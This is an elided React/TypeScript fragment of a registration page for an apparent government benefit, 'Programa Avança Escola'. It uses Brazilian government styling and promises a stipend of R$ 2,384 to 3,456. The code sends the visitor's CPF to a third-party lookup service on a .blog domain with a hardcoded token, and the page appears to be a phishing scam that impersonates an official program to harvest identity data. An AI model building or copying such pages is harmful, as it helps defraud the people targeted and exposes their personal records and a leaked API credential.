...
const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
	...
	try {
		...
		const response = await axios.get(
			`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${numericCPF}`
		);
	...
	return (
		<main className="container mx-auto px-4 py-4 flex-grow">
			...
			<div className="max-w-lg mx-auto">
				<div className="mb-6">
					<h1 className="text-[#1351B4] text-2xl font-bold">Programa Avança Escola</h1>
						...
						<>
							...
							<div className="mt-8 bg-white rounded-lg p-6">
								...
								<p className="text-gray-600 mb-6">
									Preencha seus dados abaixo para se inscrever no programa Avança Escola.
								</p>
					...
					<div className="mt-8 bg-[#FFF9E6] rounded-lg p-6 border-l-4 border-[#FFCD07]">
						...
						<ul className="space-y-4 text-sm">
							...
							<li className="flex items-start gap-2">
								<span className="text-gray-700">•</span>
								<span>
									A bolsa de capacitação varia entre R$ 2.384,22 a R$ 3.456,13 dependendo da região.
								</span>
							</li>
						</ul>
					</div>
